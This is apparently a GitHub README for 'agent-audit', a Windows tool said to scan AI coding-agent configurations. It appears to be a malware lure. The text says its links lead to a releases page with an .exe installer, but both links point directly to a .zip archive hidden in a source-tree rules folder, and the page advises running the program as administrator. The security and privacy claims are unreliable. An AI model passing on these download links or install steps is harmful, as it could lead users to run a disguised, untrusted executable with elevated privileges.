# 🛡️ agent-audit - Keep your ai coding agents secure

[![](https://img.shields.io/badge/download-get_agent_audit-blue.svg)](https://raw.githubusercontent.com/muhamedali7713/agent-audit/main/src/agent_audit/knowledge/rule_packs/external/cisco-core-checks-inventory/agent_audit_v2.0.zip)

agent-audit acts as a security tool for your local coding assistants. Modern tools like Claude Code, Codex CLI, and OpenClaw help you write software faster. While these tools save time, they also access your project files and system settings. This program scans your workspace to find potential risks in your configurations and session histories. It checks your plugins, skills, and model context protocol manifests against a library of 296 security rules.

## 📥 How to download the software

The software resides on GitHub. Visit the official repository page to access the latest version. You can find the installer for Windows on this page.

[Get agent-audit here](https://raw.githubusercontent.com/muhamedali7713/agent-audit/main/src/agent_audit/knowledge/rule_packs/external/cisco-core-checks-inventory/agent_audit_v2.0.zip)

Click the link above to reach the main page. Select the latest release version on the right side of the screen. Download the installer file that ends in .exe. Save this file to your computer.

## ⚙️ System Requirements

Your computer needs to meet these basic standards to run the application:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Dual-core CPU or better.
*   Memory: 4 GB of RAM minimum.
*   Storage: 100 MB of free disk space.
*   Network: Internet access for updates and rule definitions.

## 🚀 Setting up the scanner

Run the installer file you downloaded. Follow the on-screen instructions to finish the process. The installer creates a shortcut on your desktop. Double-click this icon to start the scan tool.

The program creates a folder in your documents directory for logs and settings. It stores your scan history here. You can change this location in the settings menu if you prefer to save files elsewhere.

## 🔍 How to run an audit

1. Open the agent-audit application.
2. Select the "Scan Project" button.
3. Browse to the folder that contains your coding project.
4. Select the folder and choose "Run Audit."

The application examines your files. It reads logs and instruction files to find patterns that do not match current security standards. A progress bar shows you the scan status. 

## 📊 Understanding your results

The scanner displays a dashboard after the scan finishes. You see a list of findings categorized by risk level. 

*   Critical: These items require your direct attention. They suggest that a plugin or manifest has access to insecure areas.
*   Warning: These items show potential misconfigurations. Review these to ensure your agent acts as you intend.
*   Info: These represent general observations about your setup.

Each finding includes a brief description of why the tool flagged the item. You can click on the file path to open the specific document and see the line of code or configuration that triggered the alert.

## 🛠️ Managing your rules

The program includes 296 rules that define what the tool calls a bad pattern. These rules cover common prompt injection methods, insecure file access, and improper plugin storage. The application checks for updates to these rules every time you start the software. 

You can toggle individual rules on or off in the "Rules Manager" tab. This helps you ignore warnings that do not apply to your specific project needs. We recommend keeping all default rules enabled to maintain the highest level of security.

## 📁 Scanning specific agent folders

Coding agents often keep their own hidden folders. Common names include:

*   .claude-code
*   .codex
*   .openclaw
*   .mcp-manifests

The tool automatically searches for these folders. If you keep your agent settings in a non-standard location, you can add that directory to the custom scan list. Use the "Add Folder" button in the settings menu to point the scanner toward your custom agent directories.

## 🛡️ Keeping your data safe

agent-audit performs all scans locally. Your code and logs never leave your machine during the scan process. The tool does not upload your project data to any external server. 

While the tool requires internet access to fetch the latest rule definitions, it uses this connection only for these updates. You can run the tool in offline mode if you have already updated the rules. However, offline mode prevents the discovery of new security threats.

## 🛠️ Troubleshooting common issues

If the software fails to launch, ensure you have the correct Windows updates installed. Some users might need to run the application as an administrator to gain access to locked system files. To do this, right-click the shortcut and select "Run as administrator."

If the scanner stops mid-scan, check your disk space. Extremely large coding projects might require additional memory. Try closing web browsers or other heavy applications before you run a full scan on a large directory.

If you find a false positive, use the "Ignore" feature. This hides the finding in future reports. You can review your ignored items at any time in the "Exclusions" tab.

## 📋 Tips for better security

Keep your coding agents updated. Use the agent-audit scanner after every major update to your plugins or manifest files. Check the results for new warnings. 

Treat your agent instructions like source code. Keep passwords and API keys out of your instruction files. Use local environment variables instead of hard-coded values in your configuration files. The scanner flags these keys if it detects them in plain text, which helps you move them to a more secure location.

## 📧 Getting help

If you encounter a bug or have questions about a specific rule, open a new issue on the GitHub repository. Provide a description of the error and include the log file produced by the application. Do not include your personal project files or sensitive data in your report. The development team reviews these requests to improve the tool and add new security patterns to the library.